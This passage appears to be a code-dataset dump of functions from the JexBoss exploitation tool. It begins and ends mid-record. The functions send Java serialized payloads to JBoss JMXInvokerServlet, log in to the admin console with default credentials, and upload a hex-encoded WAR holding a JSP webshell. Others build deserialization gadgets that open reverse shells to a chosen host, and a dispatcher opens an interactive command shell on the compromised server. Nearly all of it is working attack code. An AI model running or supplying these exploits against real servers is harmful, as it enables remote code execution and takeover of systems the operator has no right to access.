\"\\x2E\\x6A\\x62\\x6F\\x73\\x73\\x2E\\x69\\x6E\\x76\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\\x2E\\x49\\x6E\\x76\\x6F\\x63\\x61\"\n       \"\\x74\\x69\\x6F\\x6E\\x4B\\x65\\x79\\xB8\\xFB\\x72\\x84\\xD7\\x93\\x85\\xF9\\x02\\x00\\x01\\x49\\x00\\x07\\x6F\\x72\\x64\"\n       \"\\x69\\x6E\\x61\\x6C\\x78\\x70\\x00\\x00\\x00\\x04\\x70\\x78\")\n\nheaders = {\"Content-Type\": \"application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue\",\n           \"Accept\": \"text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\",\n           \"Connection\": \"keep-alive\",\n           \"User-Agent\": jexboss.get_random_user_agent()}\n\nr = gl_http_pool.urlopen('POST', url + \"/invoker/JMXInvokerServlet\", redirect=False, headers=headers, body=payload)\nresult = r.status\n\nif result == 401:\n    jexboss.print_and_flush(\"   Retrying...\")\n    gl_http_pool.urlopen('HEAD', url + \"/invoker/JMXInvokerServlet\", redirect=False, headers=headers, body=payload)\n\nreturn get_successfully(url, \"/jexinv4/jexinv4.jsp\")", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nExploits admin-console\ntested and works in JBoss 5 and 6\n:param url: The URL to exploit\n:return: The HTTP status code\n\"\"\"\n# Use default password for Jboss 5 and 6\n", "func_signal": "def exploit_admin_console(url, jboss_login):\n", "code": "username = jboss_login.split(\":\")[0]\npassword = jboss_login.split(\":\")[1]\nheaders = {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n    \"Connection\": \"keep-alive\",\n    \"User-Agent\": jexboss.get_random_user_agent()}\n\nr = gl_http_pool.request('GET', url+\"/admin-console/login.seam\", headers=headers)\n\nif r.getheader('set-cookie') is not None:\n    headers['Cookie'] = r.getheader('set-cookie')\n\nstate = get_viewstate_value(str(r.data))\n#payload = (\"login_form=login_form&login_form:name=%s&login_form:password=%s&login_form:submit=Login\"\n#           \"&javax.faces.ViewState=%s\" % (username, password, state))\nif state is None: return 505\npayload = \"login_form=login_form&login_form%3Aname=\"+username+\"&login_form%3Apassword=\"+password+\"&login_form%3Asubmit=Login&javax.faces.ViewState=\"+url_encode(state)\nheaders['Content-Type'] = \"application/x-www-form-urlencoded\"\nif jboss_login == \"admin:admin\":\n    jexboss.print_and_flush(GREEN + \"\\n * Info: Trying to perform authentication with default credentials...\" +ENDC)\nelse:\n    jexboss.print_and_flush(GREEN + \"\\n * Info: Trying to perform authentication with credentials: %s\" %jboss_login+ ENDC )\nr = gl_http_pool.request('POST', url+\"/admin-console/login.seam\", body=payload, headers=headers, redirect=False)\nstate = get_viewstate_value(str(r.data))\nif r.status == 302:\n    jexboss.print_and_flush(GREEN + \" * Info: Successfully logged in! Wait...\" + ENDC)\n    location = r.getheader('Location')\n    conversation_id = location.split('=')[1]\n    r = gl_http_pool.request('GET', location, headers=headers)\n    if state == None:\n        sleep(7)\n    r = gl_http_pool.request('GET', url+\"/admin-console/secure/summary.seam?path=-3%2FApplications%2FWeb+Application+%28WAR\"\n                                \"%29&conversationId=\"+conversation_id+\"&conversationPropagation=end\", headers=headers)\n    conversation_id = str(int(conversation_id)+1)\n    r = gl_http_pool.request('GET', url+\"/admin-console/secure/resourceTypeSummary.seam?actionMethod=secure%2FresourceType\"\n                                \"Summary.xhtml%3AcreateContentBackedResourceAction.init%28%29&conversationId=\"\n                                + conversation_id, headers=headers)\n    state = get_viewstate_value(str(r.data))\n\n    headers['Content-Type'] = \"multipart/form-data; boundary=---------------------------551367293438156646377323759\"\n\n    payload = (\"\\x50\\x4B\\x03\\x04\\x14\\x00\\x08\\x08\\x08\\x00\\x05\\xBC\\x5E\\x49\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n       \"\\x00\\x00\\x00\\x09\\x00\\x04\\x00\\x4D\\x45\\x54\\x41\\x2D\\x49\\x4E\\x46\\x2F\\xFE\\xCA\\x00\\x00\\x03\\x00\\x50\\x4B\"\n       \"\\x07\\x08\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x4B\\x03\\x04\\x14\\x00\\x08\\x08\\x08\\x00\"\n       \"\\x05\\xBC\\x5E\\x49\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x4D\\x45\\x54\\x41\"\n       \"\\x2D\\x49\\x4E\\x46\\x2F\\x4D\\x41\\x4E\\x49\\x46\\x45\\x53\\x54\\x2E\\x4D\\x46\\xF3\\x4D\\xCC\\xCB\\x4C\\x4B\\x2D\\x2E\"\n       \"\\xD1\\x0D\\x4B\\x2D\\x2A\\xCE\\xCC\\xCF\\xB3\\x52\\x30\\xD4\\x33\\xE0\\xE5\\x72\\x2E\\x4A\\x4D\\x2C\\x49\\x4D\\xD1\\x75\"\n       \"\\xAA\\x04\\x09\\x58\\xE8\\x19\\xC4\\x9B\\x9B\\x2B\\x68\\xF8\\x17\\x25\\x26\\xE7\\xA4\\x2A\\x38\\xE7\\x17\\x15\\xE4\\x17\"\n       \"\\x25\\x96\\x00\\x95\\x6B\\xF2\\x72\\xF1\\x72\\x01\\x00\\x50\\x4B\\x07\\x08\\x05\\xA0\\x0E\\xBC\\x43\\x00\\x00\\x00\\x44\"\n       \"\\x00\\x00\\x00\\x50\\x4B\\x03\\x04\\x14\\x00\\x08\\x08\\x08\\x00\\xEF\\xBB\\x5E\\x49\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n       \"\\x00\\x00\\x00\\x00\\x00\\x0A\\x00\\x00\\x00\\x6A\\x65\\x78\\x77\\x73\\x34\\x2E\\x6A\\x73\\x70\\x95\\x55\\xDB\\x6E\\xDB\"\n       \"\\x38\\x10\\x7D\\xDF\\xAF\\x60\\x08\\x04\\x10\\x1B\\x5B\\x4E\\x16\\xFB\\xD0\\x46\\x51\\xB0\\xD9\\x6E\\x82\\x74\\x51\\x6C\"\n       \"\\x83\\x5C\\xB0\\x05\\x82\\xA0\\x90\\xA8\\xB1\\xC5\\x84\\x26\\x59\\x92\\xB2\\x1D\\xB8\\xFA\\xF7\\x0E\\x29\\x5F\\xE3\\x20\"\n       \"\\xE8\\xBE\\x08\\xE4\\x70\\x66\\x78\\xE6\\xCC\\x19\\xEA\\x64\\xFF\\x4F\\x62\\x8A\\x11\\x10\\x31\\x36\\xDA\\xFA\\x9C\\x3E\"\n       \"\\x16\\x93\\x22\\x95\\x85\\x1A\\xA5\\xEF\\x7A\\x71\\xDD\\x78\\x21\\x97\\x6B\\xA1\\x97\\x2B\\x05\\x3E\\x7D\\x47\\x63\\xE8\"\n       \"\\xB9\\xE2\\xBA\\x12\\x6A\\x94\\xD3\\xBB\\xDB\\x8B\\xFE\\x7B\\xBA\\x7F\\x4A\\x4E\\x8C\\x05\\xFC\\xEE\\x13\\x2E\\x0B\\xE7\"\n       \"\\x88\\x9D\\x10\\x98\\x79\\x50\\x95\\x23\\xB7\\xB5\\x85\\xA2\\x9A\\x7F\\x52\\xA6\\xF1\\x37\\x1E\\xD7\\x63\\x22\\x5C\\xF6\"\n       \"\\xA5\\xF1\\xEB\\xBD\\x76\\x99\\x9D\\x24\\xDB\\x1E\\xBD\\x17\\x1E\\x6C\\xEE\\x6B\\xE1\\x52\\xE1\\x72\\x8C\\x8E\\x4B\\xED\"\n       \"\\x72\\x0C\\x6C\\x4D\\x53\\x4A\\xC1\\xC9\\x44\\x8B\\x8A\\xD8\\x46\\x25\\x6C\\xFE\\x57\\x33\\x1C\\x82\\x85\\xEA\\x1A\\xEF\"\n       \"\\x05\\x4B\\x84\\xCA\\x55\\x23\\x65\\xB6\\x34\\xFF\\x67\\x85\\x47\\xB3\\x6E\\x7C\\x67\\xF7\\xF6\\x79\\x1E\\x7C\\x60\\x4A\"\n       \"\\xB6\\x23\\x93\\x60\\xDA\\x40\\xB5\\xB0\\x2E\\x70\\x30\\x96\\xC5\\x14\\x1B\\x61\\x5D\\xE6\\x18\\xB6\\x89\\x7E\\x61\\x5E\"\n       \"\\x80\\xC6\\x38\\x5E\\x17\\x96\\x94\\xF7\\x0F\\x31\\x38\\x6C\\xEE\\xDF\\x1F\\x7D\\xF8\\xFD\\x21\\x13\\xCA\\x13\\x99\\x4D\"\n       \"\\x6B\\x21\\x21\\x49\\x64\\x2E\\x54\\x1A\\xA8\\x4B\\xCA\\xDE\\x61\\xAF\\x4C\\x25\\xA8\\x91\\xAF\\x19\\x3B\\x3D\\x64\\x73\"\n       \"\\xBC\\x38\\x9D\\x86\\xAC\\xF1\\x4C\\x46\\x24\\xE9\\x50\\x36\\xAE\\x4E\\x58\\xD6\\xB6\\xBC\\xF0\\xBC\\x4E\\xCE\\x67\\x1C\"\n       \"\\x8C\\x17\\x5A\\x11\\x60\\xF3\\xB6\\x6D\\x11\\x0C\\xF6\\x8C\\xB8\\xBA\\x2B\\x5B\\x0C\\x13\\x0B\\xDF\\x1B\\x70\\x3E\\x1D\"\n       \"\\x81\\xBF\\x2A\\x6C\\x31\\x86\\x00\\x93\\x1A\\x63\\x28\\xDB\\x8B\\x4E\\x6C\\x8E\\xDE\\x6F\\x78\\x65\\x2D\\x48\\x87\\x4A\"\n       \"\\xDA\\x4A\\x75\\xD9\\xD1\\x44\\xBF\\xF6\\xFF\\x39\\xFF\\x1A\\x32\\x91\\xD7\\x52\\xBD\\xF0\\xCA\\x5A\\x4C\\xE2\\x6A\\xB2\"\n       \"\\xF2\\xB6\\xE0\\x8C\\x56\\x0E\\x52\\x07\\xFE\\xA3\\x56\\xA8\\x25\\x7F\\xFB\\x6C\\x20\\xA1\\x1E\\x85\\x35\\xA8\\xFD\\x58\"\n       \"\\x62\\xD0\\x8B\\x4E\\x97\\xB6\\x2B\\x6D\\x51\\xA9\\xAC\\x79\\x1E\\x9B\\xF1\\x77\\x81\\x4C\\xB1\\xD4\\xEB\\xEE\\x00\\x97\"\n       \"\\xCE\\x48\\xE1\\x13\\x7A\\x4C\\xD9\\xFD\\xE1\\xC3\\x01\\xAD\\x53\\xA9\\x47\\x94\\x21\\xDD\\x46\\x16\\x1C\\xCE\\xA4\\x4C\"\n       \"\\x28\\xA1\\x3D\\xDA\\xC7\\x3B\\xA2\\x3C\\x5E\\x2D\\x50\\xE9\\x3E\\xAF\\x81\\x3F\\xF5\\x1B\\x53\\xE1\\x0D\\x8E\\xB2\\x7C\"\n       \"\\xC1\\xDA\\xA5\\xF7\\xE6\\xEE\\xFA\\x33\\xE2\\x56\\xC0\\x63\\x0B\\x10\\xC9\\x8E\\x91\\x05\\x6C\\x68\\x49\\x68\\x8D\\x47\"\n       \"\\xC7\\x83\\xC1\\x14\\x4A\\x57\\x83\\x94\\xE9\\x23\\xCC\\x4A\\xED\\x5C\\x98\\xB9\\xC1\\xA3\\x33\\xDF\\x26\\x60\\x1D\\x06\"\n       \"\\xA4\\x7E\\xE6\\x11\\xA5\\x36\\xA0\\xD6\\x59\\xB0\\xE3\\x3C\\x90\\x74\\xDD\\x01\\xBC\\xB2\\x78\\x6C\\xFD\\x73\\x42\\xEF\"\n       \"\\x1C\\xD8\\xFE\\xD9\\x08\\x89\\xA3\\xBD\\x57\\xD0\\x5F\\x6A\\x87\\xC9\\x0E\\xE8\\x49\\x9F\\x1E\\x6C\\x1C\\x5F\\xC3\\x58\"\n       \"\\x7B\\x38\\xAB\\x2A\\x9B\\xA0\\x52\\xB1\\xF0\\xBD\\x80\\xF2\\x22\\x48\\x92\\xC6\\x6A\\xBF\\xD1\\x03\\x24\\x96\\xA5\\x30\"\n       \"\\x13\\xCE\\x3B\\x74\\x9A\\x5F\\x21\\xA9\\x7E\\x31\\x55\\xD3\\xA8\\xE9\\x0D\\xCB\\x76\\x54\\x36\\x4D\\xB9\\xD4\\x0E\\xBB\"\n       \"\\x91\\x85\\x66\\xFD\\xEA\\xC8\\xF1\\x80\\x6C\\xC3\\x8C\\xB7\\xB2\\x55\\x97\\x27\\x79\\x69\\xE3\\xA0\\x7C\\x16\\x0A\\xD6\"\n       \"\\xBD\\x25\\xD8\\xDB\\xA3\\x87\\x58\\x81\\x9C\\xA4\\x58\\x60\\x21\\x5D\\x42\\xFF\\xA0\\xAC\\x1B\\x1F\\x13\\x20\\x26\\xF4\"\n       \"\\x5F\\xBC\\x6F\\xC9\\x2E\\xB9\\x92\\x50\\xA0\\x9C\\xBB\\x76\\xEE\\x05\\x51\\xAE\\xF4\\xED\\xEA\\x54\\xA8\\x0A\\x66\\x5F\"\n       \"\\x86\\x09\\x15\\x55\\x50\\x75\\xFF\\xE8\\xC7\\x8F\\x2D\\xAB\\xE1\\x5A\\x0D\\xC5\\xA8\\x3B\\x63\\xF3\\x5D\\xCC\\x98\\xEE\"\n       \"\\xB5\\xD1\\x5C\\xA1\\x91\\x2A\\xA1\\x17\\x05\\x32\\x5D\\x11\\xAF\\x49\\xA4\\x8D\\x0C\\xB5\\x25\\x2B\\x79\\x65\\x6D\\x10\"\n       \"\\x23\\x76\\x98\\x03\\xBE\\xB1\\x26\\x2B\\xB5\\x46\\xC4\\x8A\\x28\\x31\\xCB\\xBD\\x6D\\x20\\x16\\x7B\\xF3\\xEC\\x3C\\x8C\"\n       \"\\xE3\\xB4\\xAE\\xA4\\x30\\xC4\\xA4\\xA8\\x11\\x83\\xE3\\xEB\\xB5\\x45\\x09\\x2D\\xE9\\x18\\x04\\x3A\\x42\\xF8\\x10\\xB7\"\n       \"\\xB0\\x18\\xC2\\x75\\x4D\\xA8\\x43\\x1B\\xF5\\x90\\x2F\\xAB\\xBA\\xD1\\xFC\\x09\\x3C\\x71\\x3C\\x36\\xAF\\xDB\\x85\\x90\"\n       \"\\x05\\xE9\\x79\\x24\\x7D\\x7B\\xBC\\x7A\\x9F\\x70\\x7A\\x47\\x60\\x53\\xBC\\xDE\\x01\\x6E\\x36\\xFC\\x8F\\xA3\\x7F\\x27\"\n       \"\\x34\\x84\\x11\\x1F\\x09\\x3A\\x28\\x85\\x1A\\x94\\x85\\xAB\\x69\\xF7\\xBE\\x44\\x23\\x1F\\x57\\x28\\x39\\x40\\x93\\xC9\"\n       \"\\xAF\\x1B\\xE5\\xC5\\x18\\xA2\\x5C\\xBB\\x65\\x12\\xF4\\x08\\x1C\\x33\\xB3\\x2C\\x6A\\x08\\xFF\\x27\\x66\\xA7\\x01\\x3D\"\n       \"\\x17\\x9B\\xB2\\xF9\\x36\\x07\\x25\\xA5\\xCE\\x17\\xD6\\x27\\xEB\\x48\\xB7\\xDB\\xBB\\x9E\\x79\\x33\\xB2\\xC3\\xB9\\x2C\"\n       \"\\xE2\\x2D\\x84\\x91\\xB6\\xA8\\xDC\\xFB\\x87\\xF9\\x46\\xA9\\xF8\\xD8\\x70\\xDA\\x73\\x75\\xBB\\x4C\\xF6\\x56\\x92\\x25\"\n       \"\\x1B\\x64\\xF0\\x91\\xD0\\x83\\x50\\x74\\xFB\\x7F\\xC6\\x69\\x97\\x99\\xF5\\x38\\x55\\xDB\\xD3\\xB4\\xF8\\x1B\\x55\\xEB\"\n       \"\\x87\\x79\\x53\\xAE\\x15\\xCB\\x5E\\xFA\\xFF\\x82\\xC6\\xEF\\xD4\\x93\\xD2\\x53\\x7C\\x13\\xF5\\x78\\x5C\\xA8\\x2A\\xCE\"\n       \"\\xD9\\xFE\\xE9\\x6F\\x3F\\x01\\x50\\x4B\\x07\\x08\\x26\\x77\\xF3\\x5E\\xE3\\x03\\x00\\x00\\x99\\x08\\x00\\x00\\x50\\x4B\"\n       \"\\x01\\x02\\x14\\x00\\x14\\x00\\x08\\x08\\x08\\x00\\x05\\xBC\\x5E\\x49\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\"\n       \"\\x00\\x00\\x09\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x4D\\x45\\x54\\x41\"\n       \"\\x2D\\x49\\x4E\\x46\\x2F\\xFE\\xCA\\x00\\x00\\x50\\x4B\\x01\\x02\\x14\\x00\\x14\\x00\\x08\\x08\\x08\\x00\\x05\\xBC\\x5E\"\n       \"\\x49\\x05\\xA0\\x0E\\xBC\\x43\\x00\\x00\\x00\\x44\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n       \"\\x00\\x00\\x00\\x3D\\x00\\x00\\x00\\x4D\\x45\\x54\\x41\\x2D\\x49\\x4E\\x46\\x2F\\x4D\\x41\\x4E\\x49\\x46\\x45\\x53\\x54\"\n       \"\\x2E\\x4D\\x46\\x50\\x4B\\x01\\x02\\x14\\x00\\x14\\x00\\x08\\x08\\x08\\x00\\xEF\\xBB\\x5E\\x49\\x26\\x77\\xF3\\x5E\\xE3\"\n       \"\\x03\\x00\\x00\\x99\\x08\\x00\\x00\\x0A\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xC2\\x00\\x00\"\n       \"\\x00\\x6A\\x65\\x78\\x77\\x73\\x34\\x2E\\x6A\\x73\\x70\\x50\\x4B\\x05\\x06\\x00\\x00\\x00\\x00\\x03\\x00\\x03\\x00\\xB5\"\n       \"\\x00\\x00\\x00\\xDD\\x04\\x00\\x00\\x00\\x00\")\n\n    data = get_boundary_admin_console(jboss_version=6, state=state, payload=payload)\n    try:\n        r = gl_http_pool.request('POST', url + \"/admin-console/secure/resourceContentCreate.seam\", headers=headers,body=data)\n        if r.status != 302:\n            data = get_boundary_admin_console(jboss_version=5, state=state, payload=payload)\n            r = gl_http_pool.request('POST', url + \"/admin-console/secure/resourceContentCreate.seam\", headers=headers, body=data)\n    except:\n        sleep(1)\n\n    return get_successfully(url, \"/jexws4/jexws4.jsp\")\n\nelse:\n    jexboss.print_and_flush(RED + \"\\n * Failed authentication with username and password: %s.\\n\"\n                                  \"   Please try again with another login and password!\\n\" %jboss_login + ENDC)\n    sleep(4)\n    return 404", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nExploits java deserialization in POST parameters\nTested and working on multiple JSF, Seam and Struts applications running in JDK 6, 7 and 8.\n:param url: JSF application URL\n:param host: remote host to make a reverse shell connection\n:param port: remote port to make a reverse shell connection\n:param cmd: command to be executed into the exploited server\n:param is_win: indicate that the command to be executed is for a windows system (cmd.exe /C)\n:param param: the post parameter to inject the java serialized object\n:param force: force send payload to url provided\n:param gadget_type: the gadget type to generate the payload\n:param show_payload: show generated payload\n:param gadget_file: load user gadget from file\n:return: The HTTP Status code\n\"\"\"\n", "func_signal": "def exploit_application_deserialization(url, host, port, cmd, is_win, param, force, gadget_type, show_payload, gadget_file):\n", "code": "param_content = None\n\nheaders = {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n    \"Connection\": \"keep-alive\",\n    \"User-Agent\": jexboss.get_random_user_agent(),\n    \"Content-Type\": \"application/x-www-form-urlencoded\"}\n\nif gadget_file is None:\n    cmd = generate_cmd_for_runtime_exec(cmd=cmd, host=host, port=port, is_win=is_win)\n    payload = get_payload_gadget(gadget_type=gadget_type, cmd=cmd)\nelse:\n    try:\n        with open(gadget_file, 'rb') as f:\n            payload = f.read()\n    except:\n        jexboss.print_and_flush(RED + \"\\n * The \\\"%s\\\" file could not be found. Make sure the name is correct or let the\\n\"\n                                        \"   the tool generate the payload itself.\\n\" % (gadget_file) + ENDC)\n        return 505\n\nout = BytesIO()\nwith gzip.GzipFile(fileobj=out, mode=\"wb\") as f:\n    f.write(payload)\ngift_gziped = base64.b64encode(out.getvalue())\ngift_b64 = base64.b64encode(payload)\ngift_raw = payload\n\n# if force mode, sends payload in multiple formats\nif force:\n    if param != \"\": param += \"=\"\n    jexboss.print_and_flush(GREEN + \"\\n * Sending serialized object to: %s...\\n\" % (url) + ENDC)\n    try:\n        gl_http_pool.request('POST', url, redirect=False, headers=headers, body=param + url_encode(gift_gziped))\n        gl_http_pool.request('POST', url, redirect=False, headers=headers, body=param + url_encode(gift_b64))\n        gl_http_pool.request('POST', url, redirect=False, headers=headers, body=param + gift_raw)\n        if param != \"\":\n            r = gl_http_pool.request('POST', url, redirect=False, headers=headers, body=gift_raw)\n        headers['Content-Type'] = \"application/x-java-serialized-object; class=github.com/joaomatosf/jexboss\"\n        r = gl_http_pool.request('POST', url, redirect=False, headers=headers, body=gift_raw)\n    except:\n        # Error sending the exploit payload...\n        # import traceback, sys\n        # traceback.print_exc(file=sys.stdout)\n        return 505\nelse:\n\n    # open initial page for get cookie\n    r = gl_http_pool.request('GET', url, redirect=True, headers=headers)\n    cookie = r.getheader('set-cookie')\n    if cookie is not None: headers['Cookie'] = cookie\n\n    # Forbidden\n    if r.status == 403: return 403\n\n    # find for java serialized object in the initial page\n    param_content = get_serialized_obj_from_param(str(r.data), param)\n\n    # If does not exists a java serialized object in the initial page, check if it's a redirect page\n    if param_content is None:\n        redirect_link = get_html_redirect_link(str(r.data))\n        if redirect_link is not None:\n            r = gl_http_pool.request('GET', url + \"/\" + redirect_link, redirect=True, headers=headers)\n            param_content = get_serialized_obj_from_param(str(r.data), param)\n\n    # if param to be exploited is not ViewState, get the current viewState\n    if param != 'javax.faces.ViewState':\n        view_state = get_viewstate_value(str(r.data))\n        if view_state is not None:\n            param = \"javax.faces.ViewState=\" + url_encode(view_state) + \"&\" + param\n\n    if param != \"\": param += \"=\"\n\n    # correct the url for POST\n    url = url.split('?')[0]\n    list_url_tokens = url.split('://')[-1].split('/')\n    # if user not provided jsf page (if after / is not param or in the last param not exist a dot)\n    if len(list_url_tokens) <= 1 or '.' not in list_url_tokens[-1]:\n        # extract the url authority and link for post and make a new url to exploit\n        link = get_link_for_post(str(r.data))\n        url_base = get_url_base(url)\n        url = url_base + link\n\n    jexboss.print_and_flush(GREEN + \"\\n [*] Sending serialized object to:\\n\"\n                                    \"      --> %s...\\n\" % (url) + ENDC)\n    try:\n        if param_content.startswith(\"H4sI\"):\n            if show_payload: shows_payload(gift_gziped, gadget_file if gadget_file is not None else gadget_type)\n            r = gl_http_pool.request('POST', url, redirect=True, headers=headers,body=param + url_encode(gift_gziped))\n        elif param_content.startswith(\"rO0\"):\n            if show_payload: shows_payload(gift_b64, gadget_file if gadget_file is not None else gadget_type)\n            r = gl_http_pool.request('POST', url, redirect=True, headers=headers, body=param + url_encode(gift_b64))\n        else:\n            r = gl_http_pool.request('POST', url, redirect=True, headers=headers, body=param + gift_raw)\n    except Exception as err:\n        if 'too many redirects' in str(err):\n            return 200\n        else:\n            return 505\n\nif r.status in (301, 302):\n    return 200\nelse:\n    return r.status", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nAutomatically exploit a URL\n:param url: The URL to exploit\n:param exploit_type: One of the following\nexploitJmxConsoleFileRepository: tested and working in JBoss 4 and 5\nexploitJmxConsoleMainDeploy:\t tested and working in JBoss 4 and 6\nexploitWebConsoleInvoker:\t\t tested and working in JBoss 4\nexploitJMXInvokerFileRepository: tested and working in JBoss 4 and 5\nexploitAdminConsole: tested and working in JBoss 5 and 6 (with default password)\n\"\"\"\n", "func_signal": "def auto_exploit(url, exploit_type):\n", "code": "if exploit_type in (\"Application Deserialization\", \"Servlet Deserialization\"):\n    print_and_flush(GREEN + \"\\n * Preparing to send exploit to %s. Please wait...\\n\" % url)\nelse:\n    print_and_flush(GREEN + \"\\n * Sending exploit code to %s. Please wait...\\n\" % url)\n\nresult = 505\nif exploit_type == \"jmx-console\":\n\n    result = _exploits.exploit_jmx_console_file_repository(url)\n    if result != 200 and result != 500:\n        result = _exploits.exploit_jmx_console_main_deploy(url)\n\nelif exploit_type == \"web-console\":\n\n    # if the user not provided the path\n    if url.endswith(\"/web-console/Invoker\") or url.endswith(\"/web-console/Invoker/\"):\n        url = url.replace(\"/web-console/Invoker\", \"\")\n\n    result = _exploits.exploit_web_console_invoker(url)\n    if result == 404:\n        host, port = get_host_port_reverse_params()\n        if host == port == gl_args.cmd == None: return False\n        result = _exploits.exploit_servlet_deserialization(url + \"/web-console/Invoker\", host=host, port=port,\n                                                           cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget,\n                                                           gadget_file=gl_args.load_gadget)\nelif exploit_type == \"JMXInvokerServlet\":\n\n    # if the user not provided the path\n    if url.endswith(\"/invoker/JMXInvokerServlet\") or url.endswith(\"/invoker/JMXInvokerServlet/\"):\n        url = url.replace(\"/invoker/JMXInvokerServlet\", \"\")\n\n    result = _exploits.exploit_jmx_invoker_file_repository(url, 0)\n    if result != 200 and result != 500:\n        result = _exploits.exploit_jmx_invoker_file_repository(url, 1)\n    if result == 404:\n        host, port = get_host_port_reverse_params()\n        if host == port == gl_args.cmd == None: return False\n        result = _exploits.exploit_servlet_deserialization(url + \"/invoker/JMXInvokerServlet\", host=host, port=port,\n                                                           cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget,\n                                                           gadget_file=gl_args.load_gadget)\n\nelif exploit_type == \"admin-console\":\n\n    result = _exploits.exploit_admin_console(url, gl_args.jboss_login)\n\nelif exploit_type == \"Jenkins\":\n\n    host, port = get_host_port_reverse_params()\n    if host == port == gl_args.cmd == None: return False\n    result = _exploits.exploit_jenkins(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,\n                                               gadget=gl_args.gadget, show_payload=gl_args.show_payload)\nelif exploit_type == \"JMX Tomcat\":\n\n    host, port = get_host_port_reverse_params()\n    if host == port == gl_args.cmd == None: return False\n    result = _exploits.exploit_jrmi(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows)\n\nelif exploit_type == \"Application Deserialization\":\n\n    host, port = get_host_port_reverse_params()\n\n    if host == port == gl_args.cmd == gl_args.load_gadget == None: return False\n\n    result = _exploits.exploit_application_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,\n                                                           param=gl_args.post_parameter, force=gl_args.force,\n                                                           gadget_type=gl_args.gadget, show_payload=gl_args.show_payload,\n                                                           gadget_file=gl_args.load_gadget)\n\nelif exploit_type == \"Servlet Deserialization\":\n\n    host, port = get_host_port_reverse_params()\n\n    if host == port == gl_args.cmd == gl_args.load_gadget == None: return False\n\n    result = _exploits.exploit_servlet_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,\n                                                           gadget=gl_args.gadget, gadget_file=gl_args.load_gadget)\n\nelif exploit_type == \"Struts2\":\n\n    result = 200\n\n# if it seems to be exploited (201 is for jboss exploited with gadget)\nif result == 200 or result == 500 or result == 201:\n\n    # if not auto_exploit, ask type enter to continue...\n    if not gl_args.auto_exploit:\n\n        if exploit_type in (\"Application Deserialization\", \"Jenkins\", \"JMX Tomcat\", \"Servlet Deserialization\") or result == 201:\n            print_and_flush(BLUE + \" * The exploit code was successfully sent. Check if you received the reverse shell\\n\"\n                                   \"   connection on your server or if your command was executed. \\n\"+ ENDC+\n                                   \"   Type [ENTER] to continue...\\n\")\n            # wait while enter is typed\n            input().lower() if version_info[0] >= 3 else raw_input().lower()\n            return True\n        else:\n            if exploit_type == 'Struts2':\n                shell_http_struts(url)\n            else:\n                print_and_flush(GREEN + \" * Successfully deployed code! Starting command shell. Please wait...\\n\" + ENDC)\n                shell_http(url, exploit_type)\n\n    # if auto exploit mode, print message and continue...\n    else:\n        print_and_flush(GREEN + \" * Successfully deployed/sended code via vector %s\\n *** Run JexBoss in Standalone mode \"\n                                \"to open command shell. ***\" %(exploit_type) + ENDC)\n        return True\n\n# if not exploited, print error messagem and ask for type enter\nelse:\n    if exploit_type == 'admin-console':\n        print_and_flush(GREEN + \"\\n * You can still try to exploit deserialization vulnerabilitie in ViewState!\\n\" +\n                 \"   Try this: python jexboss.py -u %s/admin-console/login.seam --app-unserialize\\n\" %url +\n                 \"   Type [ENTER] to continue...\\n\" + ENDC)\n\n    else:\n        print_and_flush(RED + \"\\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\\n\" +\n                            \"   Type [ENTER] to continue...\\n\" + ENDC)\n    logging.error(\"Could not exploit the server %s automatically. HTTP Code: %s\" %(url, result))\n    # wait while enter is typed\n    input().lower() if version_info[0] >= 3 else raw_input().lower()\n    return False", "path": "jexboss/jexboss.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nExploits java deserialization in POST parameters\nTested and working on multiple JSF applications running in JDK6, 7 and 8.\n:param url: url of the jenkins\n:param host: remote host to make a reverse shell connection\n:param port: remote port to make a reverse shell connection\n:param cmd: command to be executed into the exploited server\n:param is_win: indicate that the command to be executed is for a windows system (cmd.exe /C)\n:param gadget: the gadget type to generate the payload\n:param show_payload: show generated payload\n:return: The HTTP Status code\n\"\"\"\n# stage 1: find client port\n", "func_signal": "def exploit_jenkins(url, host, port, cmd, is_win, gadget, show_payload):\n", "code": "headers = {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n    \"Connection\": \"keep-alive\",\n    \"User-Agent\": jexboss.get_random_user_agent()}\ncli_port = None\ncli_ip = None\n# get cli port and cli ip\nif '://' in url:\n    cli_ip = 